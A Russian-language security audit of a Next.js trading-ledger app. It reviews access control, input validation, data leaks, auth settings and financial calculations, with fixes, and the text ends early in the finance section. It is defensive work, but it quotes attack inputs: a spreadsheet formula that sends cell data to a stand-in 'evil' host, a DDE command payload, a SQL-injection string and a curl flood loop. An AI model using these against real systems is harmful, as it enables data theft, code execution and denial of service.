# SkinLedger — отчёт по аудиту

**Дата:** 2026-07-22
**Коммит:** `2c3ac8d`
**Область:** контроль доступа, обработка входных данных, утечки данных, аутентификация/конфигурация, финансовые расчёты
**Статус:** только анализ, код не изменялся

---

## Содержание

- [Сводка и приоритеты](#сводка-и-приоритеты)
- [Что сделано хорошо](#что-сделано-хорошо)
- [A. Контроль доступа](#a-контроль-доступа)
- [B. Обработка входных данных](#b-обработка-входных-данных)
- [C. Утечки данных](#c-утечки-данных)
- [D. Аутентификация и конфигурация](#d-аутентификация-и-конфигурация)
- [E. Финансовые расчёты](#e-финансовые-расчёты)
- [Тестовые сценарии с числами](#тестовые-сценарии-с-числами)
- [Приложение: полный список находок](#приложение-полный-список-находок)

---

## Сводка и приоритеты

Найдено **22 замечания**. Уязвимостей контроля доступа (IDOR) **не обнаружено** — это самая крепкая часть кода. Основной риск сместился в **финансовую корректность**: три бага искажают деньги молча, без ошибок и предупреждений в UI.

| Приор. | ID | Находка | Файл |
|---|---|---|---|
| 🔴 1 | E-2 | `fxFactor` молча возвращает `1` при отсутствии курса → занижение сумм в разы | `src/lib/currency.ts:20` |
| 🔴 2 | E-3 | `take: 5000` без `orderBy` → тихое усечение агрегатов, недостижимые сделки | `src/app/app/page.tsx:28`, `src/lib/deal-query.ts:46` |
| 🔴 3 | E-1 | Дашборд фильтрует по `sellDate`, список — по `buyDate` → агрегаты не сходятся | `src/lib/dashboard.ts:78` vs `src/lib/deal-query.ts:39` |
| 🟠 4 | C-2 | CSV formula injection в экспорте | `src/lib/deal-csv.ts:46` |
| 🟠 5 | D-2 | Rate-limiter in-memory без вытеснения → неограниченный рост `Map` | `src/lib/rate-limit.ts:6` |
| 🟠 6 | D-3 | Нет rate-limit на импорт / экспорт / `/api/skins` | `src/lib/actions/import.ts`, `src/app/api/skins/route.ts` |
| 🟠 7 | C-3 | `/api/skins`: gzip 3 МБ пересчитывается на каждый запрос, блокирует event loop | `src/app/api/skins/route.ts:24` |
| 🟠 8 | E-4 | NaN-компараторы и отсутствие tie-breaker → нестабильная пагинация | `src/lib/deal-query.ts:91-108` |
| 🟡 9 | B-4 | Payload импорта не валидируется схемой | `src/lib/actions/import.ts:207` |
| 🟡 10 | — | `npm audit`: 3 high / 4 moderate | — |
| 🟡 11 | D-4 | `script-src 'unsafe-inline'` — CSP не работает как второй рубеж | `next.config.ts:10` |
| 🟡 12 | E-5 | Столбцы `buy_fx_rate` / `sell_fx_rate` / `withdrawal_discount_pct` мертвы | `src/lib/deal-data.ts:41,50` |
| 🟡 13 | E-6 | Деньги считаются во `float`, а не `Decimal` | `src/lib/deal-query.ts:62` |
| 🟡 14 | E-7 | Список считает profit для `withdrawn_via_skin`, дашборд — нет | `src/components/deals-client.tsx:291` |
| 🔵 15 | A-1 | `findFirst` + `update`/`delete` без `userId` в самом запросе | `src/lib/actions/deals.ts:128-132, 178-183` |
| 🔵 16 | C-1 | `findUniqueOrThrow` без `select` тянет `passwordHash` в память | `src/app/app/page.tsx:27`, `src/app/app/settings/page.tsx:17` |
| 🔵 17 | D-1 | `secure` у cookie выводится из окружения, а не задан явно | `src/auth.ts:35` |
| 🔵 18 | B-1 | Параметр `platform` не валидируется | `src/lib/deal-list.ts:68` |
| 🔵 19 | B-2 | Поисковая строка `q` без ограничения длины | `src/lib/deal-list.ts:69` |
| 🔵 20 | B-3 | Нет верхних границ у цен и `quantity` | `src/lib/validation.ts:33-55` |
| 🔵 21 | B-5 | `resolvePlatform` создаёт площадку на каждое уникальное имя | `src/lib/actions/import.ts:242` |
| 🔵 22 | B-6 | Дата покупки в будущем не ограничена | `src/lib/validation.ts:63` |
| ⚪ 23 | A-2 | `/api/deals/template` без проверки сессии (данных пользователей нет) | `src/app/api/deals/template/route.ts:4` |

Легенда: 🔴 критично · 🟠 высокий · 🟡 средний · 🔵 низкий / hardening · ⚪ информационно

---

## Что сделано хорошо

Фиксирую отдельно, чтобы при рефакторинге это не потерялось.

- **Контроль доступа выдерживает атаку.** Проверены все 13 точек входа; `userId` **всегда** берётся из сессии, ни разу из параметров запроса. IDOR не найден.
- **`undoImportAction`** (`src/lib/actions/import.ts:356`) — образцовый паттерн: список id приходит от клиента, но `deleteMany` всё равно ограничен `userId` из сессии.
- **Whitelist сортировки на месте** (`src/lib/deal-list.ts:35,58`), ключ уходит не в Prisma, а в статический объект компараторов.
- **Raw SQL отсутствует полностью** — `$queryRaw` / `$executeRaw` в проекте нет.
- **Ошибки не текут:** доменный `class DealError` (`src/lib/actions/deals.ts:16`) отделяет безопасные сообщения от всего остального; стектрейсов и текстов Prisma наружу не уходит.
- **Rate-limit входа продуман лучше типового** (`src/auth.ts:59-79`): две оси (email + IP), IP-ось проверяется до БД и bcrypt, email-ось намеренно не запирает верный пароль — иначе появился бы lockout-DoS.
- **Юзер-энумерация через логин закрыта** (`src/auth.ts:72` — общая ветка для «нет пользователя» и «неверный пароль»).
- **Секреты чисты:** хардкода нет, `.gitignore:38` содержит `.env*`, в индексе только `.env.example` с плейсхолдером.
- **`TRUST_PROXY` реализован fail-closed** (`src/lib/client-ip.ts:1-14`): без доверенного прокси все клиенты схлопываются в ключ `"unknown"`, подделкой `x-forwarded-for` лимит не обойти.
- **Граница сервер/клиент держится:** `"server-only"` на трёх критичных модулях, `prisma` не импортируется ни в один `"use client"`, переменных `NEXT_PUBLIC_*` нет вовсе.
- **Пароли и токены не логируются:** валидационные логи содержат пути и тексты правил, но не значения (`src/lib/actions/deals.ts:93-96`).
- **Разделение статусов в дашборде корректно** (`src/lib/dashboard.ts:78-89`): `holding` и `withdrawn_via_skin` в торговую прибыль не попадают.

---

## A. Контроль доступа

### Таблица: роут → операции с БД → фильтр по userId → вердикт

| Роут / action | Файл | Операции с БД | Сессия | Фильтр по userId | Вердикт |
|---|---|---|---|---|---|
| `GET /api/auth/[...nextauth]` | `route.ts:3` | `user.findUnique({email})` в `authorize` | — (публичный) | n/a | ✅ по назначению |
| `GET /api/deals/export` | `export/route.ts:9-16` | через `loadUserDeals` | ✅ `auth()` + 401 | ✅ `session.user.id` → `where.userId` | ✅ |
| `GET /api/deals/template` | `template/route.ts:4` | нет | ❌ **нет проверки** | n/a | ⚠️ A-2 |
| `GET /api/skins` | `skins/route.ts:11-16` | `marketItem.findMany` | ✅ `auth()` + 401 | n/a — глобальный каталог | ✅ |
| `saveDealAction` | `actions/deals.ts:88-135` | `user.findUniqueOrThrow`, `platform.findFirst`, `marketItem.findFirst`, `deal.findFirst`, `deal.update`, `deal.create` | ✅ `requireUserId()` | ✅ владение через `findFirst({id,userId})` :128 · `update({where:{id}})` :132 без userId | ⚠️ A-1 |
| `deleteDealAction` | `actions/deals.ts:174-183` | `deal.findFirst`, `deal.delete` | ✅ | ✅ проверка :178 · `delete({where:{id}})` :183 без userId | ⚠️ A-1 |
| `deleteAllDealsAction` | `actions/deals.ts:153-158` | `deal.deleteMany({userId})` | ✅ | ✅ | ✅ |
| `setBaseCurrencyAction` | `actions/settings.ts:15-25` | `user.update({id: session.user.id})` | ✅ | ✅ id только из сессии | ✅ |
| `analyzeImportAction` | `actions/import.ts:102-168` | `user.findUniqueOrThrow({id: session})` | ✅ | ✅ | ✅ |
| `commitImportAction` | `actions/import.ts:201-308` | `user.findUniqueOrThrow`, `platform.findMany`, `platform.create`, `deal.create` | ✅ | ✅ платформы :231 `OR[{isCustom:false},{userId}]` · `deal.create` :308 userId из сессии | ✅ |
| `undoImportAction` | `actions/import.ts:344-358` | `deal.deleteMany({userId, id:{in:ids}})` | ✅ | ✅ ids от клиента, но scoped userId | ✅ образцово |
| `registerAction` / `loginAction` / `logoutAction` | `actions/auth.ts` | `user.findUnique`, `user.create` | публичные | n/a | ✅ |
| `/app` (дашборд) | `app/page.tsx:20-31` | `user.findUniqueOrThrow`, `deal.findMany({userId})` | ✅ + redirect | ✅ | ✅ |
| `/app/deals` | `deals/page.tsx:19-32` | `loadUserDeals`, `platform.findMany`, `deal.count({userId})` | ✅ + redirect | ✅ все три | ✅ |
| `/app/settings` | `settings/page.tsx:13-17` | `user.findUniqueOrThrow` | ✅ | ✅ | ✅ |
| `/app/import`, `app/layout.tsx` | `import/page.tsx:9`, `layout.tsx:19` | нет | ✅ | n/a | ✅ |

### Ответы на контрольные вопросы

**1. Проверяется ли валидная сессия?** Да, везде кроме `/api/deals/template` (A-2). Единая точка `requireUserId()` (`actions/deals.ts:18`) плюс явные `auth()` в остальных.

**2. Фильтруется ли каждый запрос по userId из сессии?** Да, **без исключений**. Приём «id владельца берётся из body/query» в проекте отсутствует.

**3. Можно ли подменой id прочитать/изменить/удалить чужое?** **Нет.**

| Попытка | Что произойдёт |
|---|---|
| `dealId=<чужой uuid>` в `saveDealAction` / `deleteDealAction` | `findFirst({id, userId})` → `null` → «Сделка не найдена» |
| `buyPlatformId` / `sellPlatformId` = чужая кастомная площадка | `assertPlatformVisible` (`deals.ts:28-33`) требует `isCustom:false OR userId=мой` → «Площадка не найдена» |
| Подмена параметров ради чужих агрегатов | Дашборд жёстко `where:{userId}`, параметров, влияющих на область выборки, нет |
| `ids=[<чужие uuid>]` в `undoImportAction` | `deleteMany({userId, id:{in:ids}})` → 0 удалений |

### Точки особого внимания

**Списки с фильтрами и сортировкой.** `loadUserDeals` (`deal-query.ts:30`) стартует с `const where = { userId }`, ни один фильтр этот ключ не перезаписывает. Фильтр по площадке пишет `where.OR` (:33), `userId` остаётся top-level → Prisma соединяет через AND. Даже если позже добавят второй `where.OR` и затрут первый, выход за пределы `userId` невозможен.

**Смена статуса сделки.** Отдельного эндпоинта нет — и это правильно. Кнопка «Продано» (`deals-client.tsx:382`) открывает ту же `DealForm`, submit идёт через `saveDealAction` с полной валидацией и проверкой владения. Отдельный «лёгкий» PATCH-статус обычно и оказывается дырой; здесь его не завели.

**Батчевые операции.** Три штуки, все чистые: `deleteAllDealsAction`, `undoImportAction`, `commitImportAction` — см. таблицу выше.

---

### A-1 · 🔵 Низкий · check-then-act без транзакции

**Файлы:** `src/lib/actions/deals.ts:128-132`, `src/lib/actions/deals.ts:178-183`

Владение проверяется через `findFirst`, но сам `update` / `delete` адресуется только по `id`:

```ts
const existing = await prisma.deal.findFirst({ where: { id: dealId, userId } });
if (!existing) return { error: "Сделка не найдена" };
await prisma.deal.update({ where: { id: dealId }, data });   // ← без userId
```

**Эксплуатируемость:** отсутствует. Владелец сделки не меняется, uuid не угадать, окно между проверкой и записью не даёт злоумышленнику ничего.

**Почему всё равно исправить:** инвариант держится на соседней строке кода, а не на самом запросе. Любая будущая правка, потерявшая `findFirst`, немедленно даёт IDOR.

**Фикс:**
```ts
const res = await prisma.deal.updateMany({ where: { id: dealId, userId }, data });
if (res.count !== 1) return { error: "Сделка не найдена" };
```
Один запрос вместо двух, инвариант в самом SQL. Аналогично `deleteMany` в `deleteDealAction`.

---

### A-2 · ⚪ Информационно · `/api/deals/template` без auth

**Файл:** `src/app/api/deals/template/route.ts:4`

```ts
export function GET() {           // ← нет auth()
  return new Response(exampleCsv(), { ... });
}
```

Отдаёт хардкод-пример из `deal-csv.ts:96-137`. Пользовательских данных нет, утечки нет.

**Фикс:** либо добавить `auth()` для единообразия, либо оставить осознанно — это ссылка со страницы импорта (`import/page.tsx:34`).

---

## B. Обработка входных данных

| # | Вопрос | Вердикт |
|---|---|---|
| 1 | Сортировка → `orderBy` Prisma | ✅ **Уязвимости нет.** Whitelist есть |
| 2 | Валидация фильтров и поиска | ⚠️ Частично — B-1, B-2 |
| 3 | Ограничение размера страницы | ✅ Размер страницы — серверная константа |
| 4 | Поисковая строка в raw SQL | ✅ Raw SQL в проекте отсутствует |
| 5 | Числовые поля (цены, комиссии, курсы) | ✅ Хорошо, кроме верхних границ — B-3 |
| 6 | `sell_date` раньше `buy_date` | ✅ Запрещено |

### 1. Сортировка — whitelist на месте, уязвимости нет

`src/lib/deal-list.ts:35,58-61`:

```ts
const SORT_KEYS = SORT_COLUMNS.map((c) => c.key) as SortKey[];
const sort = SORT_KEYS.includes(str(sp.sort) as SortKey) ? (str(sp.sort) as SortKey) : "buyDate";
const dir  = str(sp.dir) === "asc" ? "asc" : "desc";
```

Ключ уходит **не в Prisma**, а в статический объект компараторов (`deal-query.ts:94-107`); сортировка выполняется в JS после выборки. Единственный `orderBy` в проекте — жёстко зашитый (`deals/page.tsx:29`).

| Вредоносный запрос | Результат |
|---|---|
| `?sort=user.passwordHash` | тихо откатывается на `buyDate` |
| `?sort=__proto__` | `includes` не пропустит → `buyDate` |
| `?dir=; DROP TABLE deals` | не равно `"asc"` → `"desc"` |

### 2. Фильтры валидируются, кроме двух

| Параметр | Где | Валидация |
|---|---|---|
| `period` | `deal-list.ts:53` | ✅ whitelist из `PERIOD_OPTIONS` |
| `status` | `:55` | ✅ whitelist из `DEAL_STATUSES` |
| `sort` / `dir` | `:58,61` | ✅ whitelist |
| `page` | `:62` | ✅ `Math.max(1, parseInt \|\| 1)` |
| `from` / `to` | `:100-104` | ✅ невалидная дата → `undefined` |
| `platform` | `:68` | ❌ **B-1** |
| `q` | `:69` | ❌ **B-2** |

### 3. Пагинация — ограничена, `limit` клиенту не отдан

`PAGE_SIZE = 50` — константа модуля (`deal-list.ts:5`). Параметров `limit` / `per_page` в URL **не существует**.

| Вредоносный запрос | Результат |
|---|---|
| `?limit=1000000` | игнорируется, параметр не читается |
| `?page=999999` | `Math.min(filters.page, pageCount)` (`deals/page.tsx:44`) |
| `?page=-5` | `Math.max(1, ...)` → 1 |

**Смежная проблема:** выборка всегда тянет до 5000 строк в память независимо от страницы (`deal-query.ts:49`) — см. **E-3**.

### 4. Поиск не попадает в SQL

Grep по `queryRaw|executeRaw` — **ноль совпадений**. Поиск живёт целиком в JS (`deal-query.ts:85-88`):

```ts
const q = filters.q.trim().toLowerCase();
all = all.filter((d) => d.itemName.toLowerCase().includes(q));
```

Экранирование не требуется, инъекция невозможна. Причина такого решения — SQLite `LIKE` не покрывает кириллицу; она же и порождает `take: 5000`.

### 5. Числовые поля проверяются

`src/lib/validation.ts`:

| Поле | Правило | Строка |
|---|---|---|
| `buyPrice` / `sellPrice` | `.positive()` | :33-34, 58, 68 |
| `buyFeePct` / `sellFeePct` | `.min(0).max(100)` | :36-39 |
| `buyFxRate` / `sellFxRate` | `.positive()` | :41-43 |
| `quantity` | `.int().min(1)` | :52-55 |

Комиссия 0–100 — ровно как требуется. Отрицательные цены отбиты.

**Важно: fx-курсы клиент подделать не может.** `saveDealAction:110-112` и `commitImportAction:304-306` перезаписывают распарсенные значения серверным `fxFactor()` уже **после** `safeParse`. Форма их и не отправляет.

### 6. Даты — `sellDate < buyDate` запрещена

`src/lib/validation.ts:92-93`:
```ts
if (d.sellDate && d.sellDate < d.buyDate)
  ctx.addIssue({ code: "custom", path: ["sellDate"],
                 message: "Дата продажи не может быть раньше даты покупки" });
```

Работает и в форме, и в импорте (`import.ts:298` добавляет подсказку про перепутанный формат). При `status === "holding"` проверка пропускается (:84), но `sellDate` там всё равно занулён в `dealData:52`. Обхода не найдено.

---

### B-1 · 🔵 Низкий · параметр `platform` не валидируется

**Файлы:** `src/lib/deal-list.ts:68` → `src/lib/deal-query.ts:34-35`

```ts
platform: str(sp.platform) || "all",   // произвольная строка
```

**Вредоносный запрос:** `/app/deals?platform=<чужой-uuid>`

**Последствия:** инъекции нет (Prisma параметризует), пересечения с `userId` нет — вернётся пусто. Максимум — очень слабый оракул существования.

**Фикс:** сверять со списком видимых площадок, иначе `"all"`.

---

### B-2 · 🔵 Низкий · поисковая строка без ограничения длины

**Файл:** `src/lib/deal-list.ts:69`

**Вредоносный запрос:** `/api/deals/export?q=<64KB строка>` — на каждую из 5000 сделок выполняется `toLowerCase().includes(q)`.

**Фикс:** `q: str(sp.q).slice(0, 100)` при разборе.

---

### B-3 · 🔵 Низкий · нет верхних границ у числовых полей

**Файл:** `src/lib/validation.ts:33-55`

| Ввод | Проходит валидацию | Последствие |
|---|---|---|
| `buyPrice=1e308` | ✅ `.positive()` | `buyCostBase` → `Infinity`, дашборд показывает `∞` |
| `quantity=2147483647` | ✅ `.int().min(1)` | переполнение Int32 в SQLite |

Самоповреждение своего аккаунта, но данные ломаются молча.

**Фикс:** `.max(1e9)` на цены, `.max(100000)` на `quantity`.

---

### B-4 · 🟡 Средний · payload импорта не валидируется схемой

**Файл:** `src/lib/actions/import.ts:207-213`

```ts
payload = JSON.parse(formData.get("payload")?.toString() ?? "");
const rows    = payload.rows ?? [];
const mapping = payload.mapping ?? {};
const options = payload.options ?? { currency: "RUB", dateOrder: "dmy" };
```

`rows.length > MAX_ROWS` проверяется (:219), но **структура — нет**.

**Вредоносный запрос:**
```json
payload={"rows":[[1,2,3]],"mapping":{"itemName":"__proto__"},"options":{"currency":"«"}}
```

**Что удерживает систему сейчас:**
- `rowToFields` защищён `(row[i] ?? "").trim()` (`deal-import.ts:548`)
- весь цикл обёрнут в per-row `try/catch` (`import.ts:311`)
- произвольный `options.currency` доезжает до `buyCurrency` через `validCur(..., opts.currency)` (`deal-import.ts:537`, фолбэк на самого себя) — и отбивается только вторым рубежом `z.enum(CURRENCIES)` в `dealSchema:59`

Опора на `catch` вместо схемы — единственное, что держит этот путь.

**Фикс:**
```ts
const payloadSchema = z.object({
  rows: z.array(z.array(z.string())).max(MAX_ROWS),
  mapping: z.record(z.enum(CSV_KEYS), z.number().int().min(0)),
  options: z.object({ currency: z.enum(CURRENCIES), dateOrder: z.enum(["dmy","mdy"]),
                      flagCol: z.number().int().min(0).nullable().optional() }),
});
```

---

### B-5 · 🔵 Низкий · `resolvePlatform` без лимита создаваемых площадок

**Файл:** `src/lib/actions/import.ts:242-250`

Создаёт площадку на каждое уникальное имя без ограничений. Файл с 5000 разными названиями → 5000 строк в `platforms`.

**Фикс:** счётчик созданных за один импорт (напр. 50), дальше — в `DEFAULT_PLATFORM`.

---

### B-6 · 🔵 Низкий · дата покупки в будущем не ограничена

**Файл:** `src/lib/validation.ts:63` — `buyDate: z.coerce.date()` без `.max()`.

`buyDate=2999-01-01` пройдёт; `holdingDays` вернёт 0 (`deal-math.ts:44` клампит), но сделка выпадет из всех периодных фильтров.

**Фикс:** `.max(new Date(), "Дата не может быть в будущем")`.

---

## C. Утечки данных

### 1. Что возвращают API

| Эндпоинт | Whitelist полей | Оценка |
|---|---|---|
| `/api/deals/export` | ✅ через `DealDTO` | ручной маппинг `deal-query.ts:55-82`, `userId` в DTO не попадает |
| `/api/skins` | ✅ явный `select` | `skins-index.ts:33-47` — 13 полей каталога |
| `/app/deals` → `DealsClient` | ✅ | `platform` → `PlatformDTO` (`deals/page.tsx:34-40`), `userId` площадки отброшен |

`password_hash` в JSON/RSC не уходит нигде. Чужие email недостижимы — единственная связь с `User` в выборках это `findUnique` по собственному id.

### 2. Ошибки — наружу не текут

Сделано осознанно: `src/lib/actions/deals.ts:16` заводит доменный `class DealError extends Error`, а `:143` отдаёт клиенту `e.message` **только** для него — всё прочее превращается в «Не удалось сохранить сделку». Стектрейсов, текстов Prisma и деталей SQL в ответах нет. `import.ts:122,208,311` — везде generic-строки.

**Принятый риск:** `actions/auth.ts:67-68` возвращает «Пользователь с таким email уже зарегистрирован» → энумерация email через регистрацию. Это UX-компромисс (без него регистрация неюзабельна), смягчён лимитом 5 регистраций/час на IP. Рекомендую зафиксировать как осознанное решение, а не чинить.

### 3. Клиентский бандл — граница держится

- `prisma` импортируется только в `auth.ts`, `deal-query.ts`, `skins-index.ts`, `actions/*`, `app/**/page.tsx` — ни один не помечен `"use client"`
- `"server-only"` на трёх критичных модулях: `deal-query.ts:3`, `rates.ts:1`, `skins-index.ts:1` — даст ошибку сборки при случайном импорте из клиента
- Общие модули (`deal-math`, `deal-list`, `currency`, `types`, `deal-csv`, `deal-import`) — чистые, без БД и секретов, шарятся намеренно
- `process.env` в рантайме: `DATABASE_URL` (`prisma.ts:7`), `TRUST_PROXY` (`client-ip.ts:7`), `NODE_ENV` — все в серверных модулях
- Переменных `NEXT_PUBLIC_*` в проекте **нет вообще**, значит и утечь через бандл нечему

### 4. Логи — паролей и токенов нет

Проверены все `console.*`:

| Место | Что логируется |
|---|---|
| `deals.ts:93-96` | `issues.map(i => path + message)` — пути и тексты правил, **не значения** |
| `deals.ts:141,164,189` | объект ошибки (серверный лог) |
| `auth.ts` | credentials не логируются |
| `actions/auth.ts` | пароль не логируется |

JWT нигде не печатается.

### 5. Автоподсказки скинов — чужие сделки не подсказывают

**Прямой ответ: нет.** `/api/skins` → `getSkinFamilies()` → `prisma.marketItem.findMany` (`skins-index.ts:32`). Это глобальный справочник CS2 (источник ByMykel/CSGO-API); у модели `MarketItem` **нет поля `userId`** в схеме. Таблица `deals` в этом пути не участвует вообще. Фильтр по userId здесь не нужен, его отсутствие — не дефект.

---

### C-1 · 🔵 Низкий · `findUniqueOrThrow` без `select` тянет `passwordHash`

**Файлы:** `src/app/app/page.tsx:27`, `src/app/app/settings/page.tsx:17`

```ts
prisma.user.findUniqueOrThrow({ where: { id: userId } })   // вся модель User
```

Используется только `user.baseCurrency`. В RSC-payload хэш **не улетает** (в JSX уходит лишь строка валюты), поэтому это не утечка, а нарушение least-privilege: одна неосторожная правка вида `<Foo user={user} />` — и хэш в бандле.

Рядом есть правильный образец: `deal-query.ts:42-45` и `import.ts:165-168` делают `select: { baseCurrency: true }`.

**Фикс:** добавить тот же `select` в оба места.

---

### C-2 · 🟠 Высокий · CSV formula injection в экспорте

**Файл:** `src/lib/deal-csv.ts:46-58`

```ts
function csvCell(value: string, delimiter: string): string {
  if (value === "") return "";
  if (value.includes(delimiter) || value.includes('"') ||
      value.includes("\n") || value.includes("\r")) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;                       // ← ведущие = + - @ \t \r не нейтрализуются
}
```

Функция корректно решает задачу CSV-квотинга, но не задачу formula injection. Поля `itemName` и `note` — пользовательский ввод, `validation.ts:47,74` ограничивают только длину.

**Сценарий:**
1. Пользователь заводит сделку с названием `=HYPERLINK("http://evil/?d="&A1,"клик")` или `=cmd|'/c calc'!A0`
2. Жмёт «Экспорт CSV» (`deals-client.tsx:239`)
3. Excel исполняет формулу при открытии файла

**Оценка:** сейчас преимущественно самоповреждение (свой экспорт). Становится боевым немедленно, как только появится шаринг выгрузки или отправка её в поддержку.

**Фикс:** в `csvCell` при первом символе из `=+-@\t\r` префиксовать апострофом и всегда заворачивать в кавычки:
```ts
const needsGuard = /^[=+\-@\t\r]/.test(value);
if (needsGuard) return `"'${value.replace(/"/g, '""')}"`;
```

---

### C-3 · 🟠 Высокий · `/api/skins` как усилитель нагрузки

**Файл:** `src/app/api/skins/route.ts:16-27`

- ~3 МБ JSON (~460 КБ gzip)
- `gzipSync` **синхронный** и пересчитывается на **каждый** запрос → блокирует event loop
- rate-limit отсутствует

**Вредоносный запрос:**
```bash
for i in $(seq 1 200); do curl -H 'Cookie: <своя валидная сессия>' https://host/api/skins & done
```

`Cache-Control: private, max-age=3600` помогает браузеру, но не атакующему.

**Фикс:** считать gzip-буфер один раз рядом с кэшем `cache` в `skins-index.ts`, отдавать готовый + `ETag` / `304`.

---

## D. Аутентификация и конфигурация

| # | Пункт | Вердикт |
|---|---|---|
| 1 | Cookie: httpOnly / secure / sameSite | ⚠️ дефолты Auth.js — D-1 |
| 2 | CSRF | ✅ самодельных POST-роутов нет |
| 3 | Rate limiting login / register | ✅ сделано вдумчиво |
| 4 | Токен восстановления пароля | n/a — функциональности нет |
| 5 | Секреты | ✅ только env |
| 6 | Заголовки безопасности | ⚠️ набор полный, но `unsafe-inline` |
| 7 | Зависимости | ⚠️ 3 high / 4 moderate |

### 1. Cookie

Явной конфигурации нет — работают дефолты Auth.js v5: `httpOnly: true` ✅, `sameSite: "lax"` ✅, `path: "/"`, `secure` включается вместе с префиксом `__Secure-`, когда URL считается https. Стратегия — `jwt` (`auth.ts:36`). См. D-1.

### 2. CSRF — закрыт

- Все мутации — Server Actions; Next.js 16 проверяет `Origin` против `Host` для action-запросов из коробки
- Самодельных POST/PUT/DELETE-роутов в проекте **нет вообще**: `/api/deals/export`, `/api/deals/template`, `/api/skins` — только `GET`
- `/api/auth/[...nextauth]` — штатный CSRF-механизм Auth.js
- `next.config.ts:17` добавляет `form-action 'self'`

### 3. Rate limiting входа — сильная сторона

`src/auth.ts:59-79` разделяет две оси и обосновывает почему (комментарии `:57-64`):

| Ось | Лимит / окно | Логика |
|---|---|---|
| IP | 30 / 60 с | проверяется **до** БД и bcrypt → защита CPU от объёмного перебора |
| email | 10 / 15 мин | **не запирает верный пароль** — иначе злоумышленник, зная чужой email, блокировал бы вход жертве (lockout-DoS) |

Счётчик растёт только на неудачах, сбрасывается при успехе (`:79`). Регистрация — 5/час по IP, считаются **все** попытки (`actions/auth.ts:59-61`), что закрывает обход через смену email.

### 4. Восстановление пароля — функциональности нет

Ни роута, ни токена, ни модели в `prisma/schema.prisma`. Пункт неприменим.

**Когда будете добавлять**, три требования сразу в схему:
```prisma
model PasswordResetToken {
  tokenHash String   @unique   // хранить ХЭШ токена, не токен
  userId    String
  expiresAt DateTime            // TTL
  usedAt    DateTime?           // одноразовость
}
```
Плюс инвалидация всех активных токенов пользователя при успешной смене пароля.

### 5. Секреты — чисто

- Хардкода нет: `AUTH_SECRET` читается Auth.js из env, `DATABASE_URL` — `prisma.ts:7`
- `.gitignore:38` содержит `.env*` с исключением `!.env.example`
- `git ls-files` подтверждает: в индексе только `.env.example` с плейсхолдером
- `TRUST_PROXY` документирован с fail-closed поведением (`client-ip.ts:1-14`)

### 6. Заголовки безопасности — набор полный

`next.config.ts:21-34`: CSP, HSTS `max-age=63072000; includeSubDomains; preload`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`. В CSP присутствуют `frame-ancestors 'none'`, `base-uri 'self'`, `object-src 'none'`, `form-action 'self'`. Единственное замечание — D-4.

### 7. Зависимости — `npm audit`: 7 (3 high, 4 moderate)

| Пакет | Severity | Суть | Достижимо здесь? |
|---|---|---|---|
| `fast-uri` 3.0.0–3.1.3 | **high** | host confusion через литеральный `\` | транзитивный; фикс без брейка |
| `sharp` <0.35.0 | **high** | CVE-2026-33327/33328/35590/35591 в libvips | `next/image` не используется → низкая достижимость |
| `next` (через postcss/sharp) | **high** | — | — |
| `postcss` <8.5.10 | moderate | XSS через неэкранированный `</style>` | build-time |
| `@hono/node-server` ≤2.0.4 → `@prisma/dev` → `prisma` | moderate | path traversal в serve-static | **devDependency**, в прод не идёт |

**Практическая рекомендация:** `npm audit fix` **без** `--force` безопасно закрывает `fast-uri` и цепочку `prisma`/`@hono/node-server`.

> ⚠️ **`npm audit fix --force` предлагает откат на `next@9.3.3` — не делайте этого.** Это деградация на 7 мажоров. `sharp` / `postcss` подтянутся со следующим патчем Next 16.

Версии в проекте свежие (`next@16.2.10`, `prisma@7.8.0`, `@prisma/client@7.8.0`, `zod@4.4.3`, `bcryptjs@3.0.3`), заброшенных пакетов нет. `next-auth@5.0.0-beta.31` — бета, но это единственный доступный вариант v5.

---

### D-1 · 🔵 Низкий (проверить в проде) · `secure` выводится, а не задан

**Файл:** `src/auth.ts:35`

С `trustHost: true` протокол берётся из `x-forwarded-proto`. За прокси, который этот заголовок не выставляет, cookie сессии уедет **без флага `Secure`**.

**Фикс:** задать `AUTH_URL=https://...` в проде либо явный блок:
```ts
cookies: { sessionToken: { options: { httpOnly: true, sameSite: "lax", secure: true } } }
```
Заодно стоит задать `session.maxAge` — сейчас дефолтные 30 дней без ротации.

---

### D-2 · 🟠 Высокий · rate-limiter in-memory без вытеснения

**Файл:** `src/lib/rate-limit.ts:6`

```ts
const buckets = new Map<string, { count: number; resetAt: number }>();
```

Записи удаляются **только** в `clearLimit` при успешном входе. `liveBucket` (`:8-12`) возвращает `null` для протухшего бакета, но саму запись не чистит — протухшие ключи живут вечно, пока по тому же ключу не придёт новый запрос.

**Вредоносный сценарий:** при `TRUST_PROXY=true` ключ содержит IP → распределённый перебор с ротацией адресов даёт неограниченный рост `Map` → OOM.

Базовое ограничение (счётчики не переживают рестарт и не общие между инстансами) честно зафиксировано в комментарии `:2-5` как долг.

**Фикс:** периодический sweep протухших ключей + переезд в общий store (таблица в Postgres или Upstash Redis) перед горизонтальным масштабированием.

---

### D-3 · 🟠 Высокий · мутации без rate-limit

Лимиты стоят только на login / register. **Не покрыты:**

| Путь | Стоимость запроса |
|---|---|
| `analyzeImportAction` (`import.ts:98`) | 5 МБ xlsx → `XLSX.read` + `pickBestSheet`, который прогоняет `mapColumns` по **каждому листу** (`import.ts:59-72`) |
| `commitImportAction` (`import.ts:197`) | до 5000 `INSERT` в цикле, **по одному** (`:308`) |
| `GET /api/deals/export` | выборка и сериализация 5000 строк |
| `GET /api/skins` | см. C-3 |

Залогиненный пользователь кладёт инстанс десятком параллельных импортов.

**Фикс:** тот же `checkLimit` по `userId` на этих четырёх путях.

---

### D-4 · 🟡 Средний · `script-src 'unsafe-inline'`

**Файл:** `next.config.ts:10`

Причина в комментарии верная (бутстрап-скрипты Next), но следствие — CSP перестаёт быть вторым рубежом против XSS.

**Оценка:** активного XSS-вектора не найдено (React экранирует, `dangerouslySetInnerHTML` в проекте отсутствует), поэтому это глубина обороны, а не действующая дыра.

**Фикс:** nonce-based CSP через middleware. Учтите: middleware в проекте пока нет вовсе, так что это заметный объём работы.

---

## E. Финансовые расчёты

### Ответы на контрольные вопросы

**1. Комиссии применяются правильно.** `src/lib/deal-math.ts:14-36`:

```
buyCostBase     = buyPrice  × qty × (1 + buyFeePct/100)  × buyFxRate    // наценка ✅
sellRevenueBase = sellPrice × qty × (1 − sellFeePct/100) × sellFxRate   // вычет   ✅
